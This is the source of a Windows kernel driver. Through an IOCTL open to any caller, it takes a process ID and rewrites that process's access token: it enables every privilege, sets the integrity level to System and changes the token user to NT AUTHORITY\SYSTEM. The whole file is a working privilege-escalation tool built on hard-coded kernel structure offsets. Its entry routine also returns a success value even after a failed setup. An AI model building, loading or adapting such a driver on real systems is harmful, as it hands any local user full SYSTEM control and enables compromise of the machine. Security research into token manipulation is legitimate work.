#include <ntifs.h>

#define DRIVER_PREFIX "GetFullPrivsDrv: "
#define DEVICE_PATH L"\\Device\\GetFullPrivs"
#define SYMLINK_PATH L"\\??\\GetFullPrivs"

// _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista.
// The offset from _TOKEN have been fixed for now (Win 11 23H2).
// See - https://www.vergiliusproject.com/kernels/x64/Windows%20Vista%20%7C%202008/RTM/_TOKEN
#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL
#define SEP_TOKEN_OFFSET 0x40

//
// Global Variables
//
ULONG g_UserAndGroupCountOffset = 0u;
ULONG g_UserAndGroupsOffset = 0u;
ULONG g_IntegrityLevelIndexOffset = 0u;

//
// Struct definition
//
typedef struct _SEP_TOKEN_PRIVILEGES
{
	ULONGLONG Present;
	ULONGLONG Enabled;
	ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;

//
// Ioctl code definition
//
#define IOCTL_GET_ALL_PRIVS CTL_CODE(0x8000, 0x0200, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);


//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
	PDEVICE_OBJECT pDeviceObject = nullptr;

	do
	{
		RTL_OSVERSIONINFOW versionInfo{ 0 };
		UNICODE_STRING devicePath{ 0 };
		UNICODE_STRING symlinkPath{ 0 };
		::RtlInitUnicodeString(&devicePath, DEVICE_PATH);
		::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);

		ntstatus = ::RtlGetVersion(&versionInfo);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to get OS version information (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "OS Version - %u.%u.%u\n",
				versionInfo.dwMajorVersion,
				versionInfo.dwMinorVersion,
				versionInfo.dwBuildNumber));

			// _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista
			if ((versionInfo.dwMajorVersion == 6))
			{
				if (versionInfo.dwMinorVersion < 2)
				{
					// From Windows Vista to Windows 7 SP1
					g_UserAndGroupCountOffset = 0x78;
					g_UserAndGroupsOffset = 0x90;
					g_IntegrityLevelIndexOffset = 0xC8;
				}
				else
				{
					// From Windows 8 to Windows 8.1
					g_UserAndGroupCountOffset = 0x7C;
					g_UserAndGroupsOffset = 0x98;
					g_IntegrityLevelIndexOffset = 0xD0;
				}
			}
			else if (versionInfo.dwMajorVersion == 10)
			{
				// From Windows 10 1509 to Windows 11 23H2
				g_UserAndGroupCountOffset = 0x7C;
				g_UserAndGroupsOffset = 0x98;
				g_IntegrityLevelIndexOffset = 0xD0;
			}
			else
			{
				// Older than Windows Vista does not have _SEP_TOKEN_PRIVILEGE
				ntstatus = STATUS_NOT_SUPPORTED;
				KdPrint((DRIVER_PREFIX "Unsupported OS version is detected.\n"));
				break;
			}

		}

		ntstatus = ::IoCreateDevice(
			DriverObject,
			NULL,
			&devicePath,
			FILE_DEVICE_UNKNOWN,
			NULL,
			FALSE,
			&pDeviceObject);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceObject = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to create device (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to create symbolic link (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		DriverObject->DriverUnload = DriverUnload;
		DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

		KdPrint((DRIVER_PREFIX "Driver is loaded successfully.\n"));
	} while (false);

	if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr))
		::IoDeleteDevice(pDeviceObject);

	return false;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symlinkPath{ 0 };
	::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);
	::IoDeleteSymbolicLink(&symlinkPath);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "Driver is unloaded.\n"));
}


NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_SUCCESS;
	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = 0u;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}


NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
	ULONG_PTR info = NULL;
	PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
	auto& dic = irpSp->Parameters.DeviceIoControl;

	switch (dic.IoControlCode)
	{
	case IOCTL_GET_ALL_PRIVS:
		if (dic.InputBufferLength < sizeof(ULONG))
		{
			ntstatus = STATUS_BUFFER_TOO_SMALL;
			KdPrint((DRIVER_PREFIX "Input buffer is too small.\n"));
			break;
		}

		PEPROCESS pEprocess = nullptr;
		auto pid = ::ULongToHandle(*(ULONG*)Irp->AssociatedIrp.SystemBuffer);

		ntstatus = ::PsLookupProcessByProcessId(pid, &pEprocess);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to PsLookupProcessByProcessId() (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
			auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + SEP_TOKEN_OFFSET);
			auto nUserAndGroupCount = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupCountOffset);
			auto pUserAndGroups = *(PSID_AND_ATTRIBUTES*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupsOffset);
			auto nIntegrityLevelIndex = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_IntegrityLevelIndexOffset);

			KdPrint((DRIVER_PREFIX "Primary token for PID %u is at %p.\n", ::HandleToULong(pid), pPrimaryToken));
			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is at %p.\n", ::HandleToULong(pid), pSepToken));

			pSepToken->Present = VALID_PRIVILEGE_MASK;
			pSepToken->Enabled = VALID_PRIVILEGE_MASK;
			pSepToken->EnabledByDefault = VALID_PRIVILEGE_MASK;

			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is overwritten successfully.\n", HandleToULong(pid)));

			// Overwrite Integrity Level to System level
			auto pSid = (PISID)pUserAndGroups[nIntegrityLevelIndex].Sid;
			pSid->SubAuthority[0] = 0x4000;

			KdPrint((DRIVER_PREFIX "Integrity level of PID %u is modified to System level.\n", HandleToULong(pid)));

			for (auto idx = 0u; idx < nUserAndGroupCount; idx++)
			{
				// Overwrite token user to "NT AUTHORITY\SYSTEM"
				if (pUserAndGroups[idx].Attributes == 0)
				{
					pSid = (PISID)pUserAndGroups[idx].Sid;

					for (auto offset = 1; offset < pSid->SubAuthorityCount; offset++)
						pSid->SubAuthority[offset] = 0;

					pSid->SubAuthorityCount = 1;
					pSid->IdentifierAuthority.Value[0] = 0;
					pSid->IdentifierAuthority.Value[1] = 0;
					pSid->IdentifierAuthority.Value[2] = 0;
					pSid->IdentifierAuthority.Value[3] = 0;
					pSid->IdentifierAuthority.Value[4] = 0;
					pSid->IdentifierAuthority.Value[5] = 5;
					pSid->SubAuthority[0] = 18;

					KdPrint((DRIVER_PREFIX "Token user of PID %u is modified to \"NT AUTHORITY\\SYSTEM\".\n", HandleToULong(pid)));
					break;
				}
			}

			::PsDereferencePrimaryToken(pPrimaryToken);
			ObDereferenceObject(pEprocess);
		}
	}

	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}